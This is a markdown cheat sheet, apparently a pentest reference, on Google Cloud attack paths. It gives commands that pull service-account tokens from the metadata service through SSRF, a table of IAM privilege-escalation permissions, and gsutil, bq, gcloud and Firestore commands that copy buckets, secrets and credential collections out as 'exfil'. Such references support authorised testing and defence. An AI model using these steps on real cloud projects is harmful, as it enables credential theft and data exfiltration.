# GCP Attack Paths

## Initial Access Vectors

### Credential Discovery
- Service account JSON keys in repos (look for `"type": "service_account"`)
- Firebase config in client-side code (`apiKey`, `authDomain`, `projectId`)
- GCS bucket names derived from project IDs
- OAuth client secrets in mobile apps
- Metadata from SSRF: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/`

### Unauthenticated Access
- Public GCS buckets: `gsutil ls gs://<bucket>`
- Firebase Realtime Database: `curl https://<project>.firebaseio.com/.json`
- Firestore without security rules
- Cloud Functions with `--allow-unauthenticated`
- App Engine default service with no IAP
- Public BigQuery datasets

### Metadata Service
```bash
# Instance metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
# Service account token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Project-wide metadata (SSH keys, startup scripts)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/
# Kubernetes-specific
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

## Privilege Escalation

### IAM Policy Abuse
| Technique | Required Permission | Impact |
|-----------|-------------------|--------|
| setIamPolicy | `*.setIamPolicy` on resource | Grant self any role |
| actAs service account | `iam.serviceAccounts.actAs` | Impersonate SA |
| Create SA key | `iam.serviceAccountKeys.create` | Persistent access as SA |
| Deploy Cloud Function | `cloudfunctions.functions.create` + `actAs` | Execute as SA |
| Create Compute Instance | `compute.instances.create` + `actAs` | Run as SA |
| Token generation | `iam.serviceAccounts.getAccessToken` | Direct impersonation |
| Sign blob/JWT | `iam.serviceAccounts.signBlob` | Forge tokens |
| Org policy bypass | `orgpolicy.policy.set` | Disable security constraints |

### Workload Identity Federation
```bash
# Check for overly broad OIDC conditions
gcloud iam workload-identity-pools providers describe <provider> --location=global --workload-identity-pool=<pool>
# If subject condition is "*" or missing — any token from that issuer works
```

### Cross-Project Pivoting
- Shared VPC host project → service projects
- Service account impersonation chains
- Organization-level roles granting access to all projects
- Billing account access → project enumeration

## Data Exfiltration

### GCS
```bash
gsutil ls gs://<bucket>
gsutil cp -r gs://<bucket> ./exfil/
# Check IAM on bucket
gsutil iam get gs://<bucket>
```

### BigQuery
```bash
bq ls --project_id=<project>
bq query --use_legacy_sql=false 'SELECT * FROM `project.dataset.table` LIMIT 100'
```

### Secret Manager
```bash
gcloud secrets list --project=<project>
gcloud secrets versions access latest --secret=<name>
```

### Firestore/Datastore
```bash
gcloud firestore export gs://<bucket> --collection-ids=users,credentials
```

## GKE-Specific

```bash
# Get cluster credentials
gcloud container clusters get-credentials <cluster> --zone <zone>
# Check node pool service account
gcloud container node-pools describe <pool> --cluster=<cluster> --zone=<zone> --format='value(config.serviceAccount)'
# Workload Identity mapping
kubectl get serviceaccount -A -o json | jq '.items[] | select(.metadata.annotations["iam.gke.io/gcp-service-account"])'
```

## Tools

| Tool | Purpose |
|------|---------|
| ScoutSuite | Multi-cloud security auditing |
| GCPBucketBrute | Bucket enumeration |
| Hayat | GCP privilege escalation |
| gcp_enum | Service enumeration |
| Cartography | Infrastructure graph |
| Steampipe | SQL queries against GCP APIs |
